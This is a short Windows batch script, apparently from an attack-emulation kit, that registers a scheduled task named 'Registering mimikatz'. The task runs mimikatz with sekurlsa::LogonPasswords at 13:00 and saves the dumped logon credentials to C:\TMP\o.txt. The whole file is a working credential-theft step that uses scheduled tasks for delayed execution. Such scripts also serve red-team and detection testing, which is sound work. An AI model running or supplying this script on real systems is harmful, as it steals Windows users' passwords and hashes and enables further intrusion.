@ECHO OFF

ECHO ===========================================================================
ECHO At Job Creation
ECHO Registering mimikatz in schtasks job
ping -n 5 127.0.0.1 > NUL

schtasks /create /tn "Registering mimikatz" /tr "C:\TMP\mim.exe sekurlsa::LogonPasswords > C:\TMP\o.txt" /sc once /st 13:00
